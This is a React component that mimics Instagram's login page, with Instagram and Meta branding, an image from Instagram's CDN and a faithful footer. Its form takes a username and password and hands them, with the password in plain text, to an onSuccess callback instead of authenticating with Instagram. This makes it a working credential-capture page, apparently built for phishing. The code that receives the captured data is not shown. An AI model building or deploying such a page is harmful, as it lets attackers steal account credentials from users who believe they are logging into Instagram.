import React, { useState } from 'react';
import { Globe } from 'lucide-react';

interface InstagramLoginProps {
  onSuccess: (data: any) => void;
}

const InstagramLogin: React.FC<InstagramLoginProps> = ({ onSuccess }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSuccess({ platform: 'Instagram', username, password });
  };

  return (
    <div className="min-h-full w-full bg-[#000000] text-white flex flex-col justify-between font-sans select-none animate-view overflow-y-auto">
      <div className="flex-1 max-w-[1040px] mx-auto w-full grid grid-cols-1 lg:grid-cols-2 gap-12 items-center px-8 py-16">
        
        <div className="flex flex-col space-y-10 select-none">
          <div className="flex items-center space-x-3">
            <div className="w-11 h-11 rounded-xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] flex items-center justify-center shadow-lg">
              <Globe size={24} className="text-white" />
            </div>
            <span className="text-3xl font-extrabold tracking-tight font-jakarta text-white">Instagram</span>
          </div>

          <h2 className="text-4xl md:text-5xl font-extrabold tracking-tight leading-[1.15]">
            See everyday<br />moments from your<br />
            <span className="ig-gradient-text">close friends.</span>
          </h2>

          <div className="relative max-w-[340px] shrink-0 select-none mx-auto lg:mx-0">
            <img 
              src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" 
              className="w-full h-auto object-contain drop-shadow-[0_15px_30px_rgba(0,0,0,0.8)]" 
              alt="Instagram Stories Stack"
            />
          </div>
        </div>

        <div className="flex flex-col items-center lg:border-l lg:border-neutral-800 lg:pl-12 w-full">
          <form onSubmit={handleSubmit} className="w-full max-w-[380px] flex flex-col space-y-6 select-none py-4">
            
            <span className="text-sm font-semibold tracking-wide text-neutral-300 self-start">Log into Instagram</span>

            <div className="flex flex-col space-y-3.5">
              <input 
                type="text" 
                placeholder="Mobile number, username or email" 
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full bg-[#121212] border border-neutral-800 focus:border-neutral-600 rounded-lg py-3 px-4 outline-none transition text-sm text-white"
              />
              <input 
                type="password" 
                placeholder="Password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full bg-[#121212] border border-neutral-800 focus:border-neutral-600 rounded-lg py-3 px-4 outline-none transition text-sm text-white"
              />
            </div>

            <button type="submit" className="w-full bg-[#0095f6] hover:bg-[#18acfe] text-white text-sm font-bold py-3 rounded-lg transition scale-on-click shadow-md shadow-blue-500/10">
              Log in
            </button>

            <a href="#" className="text-neutral-400 text-xs text-center hover:underline transition self-center py-1">Forgot password?</a>

            <div className="flex flex-col space-y-3 pt-4">
              <button type="button" className="w-full border border-neutral-800 hover:border-neutral-700 text-[#0095f6] hover:text-white transition text-xs font-semibold scale-on-click py-3 rounded-full flex items-center justify-center space-x-2">
                <Globe size={14} />
                <span>Log in with Facebook</span>
              </button>

              <button type="button" className="w-full border border-neutral-800 hover:border-neutral-700 text-white transition text-xs font-semibold scale-on-click py-3 rounded-full flex items-center justify-center">
                Create new account
              </button>
            </div>

            <div className="flex items-center justify-center space-x-1 text-xs text-neutral-500 pt-8">
              <span className="font-bold">Meta</span>
            </div>
          </form>
        </div>
      </div>

      <div className="bg-black border-t border-neutral-900 px-8 py-10 text-[11px] text-neutral-500 text-center flex flex-col space-y-4">
        <div className="flex flex-wrap justify-center gap-x-5 gap-y-1.5 max-w-[800px] mx-auto">
          <a href="#" className="hover:underline">Meta</a>
          <a href="#" className="hover:underline">About</a>
          <a href="#" className="hover:underline">Blog</a>
          <a href="#" className="hover:underline">Jobs</a>
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">API</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Locations</a>
          <a href="#" className="hover:underline">Instagram Lite</a>
          <a href="#" className="hover:underline">Threads</a>
          <a href="#" className="hover:underline">Contact uploading and non-users</a>
          <a href="#" className="hover:underline">Meta Verified</a>
        </div>
        <div className="flex justify-center items-center space-x-2 text-[10px]">
          <span>© 2026 Instagram from Meta</span>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;
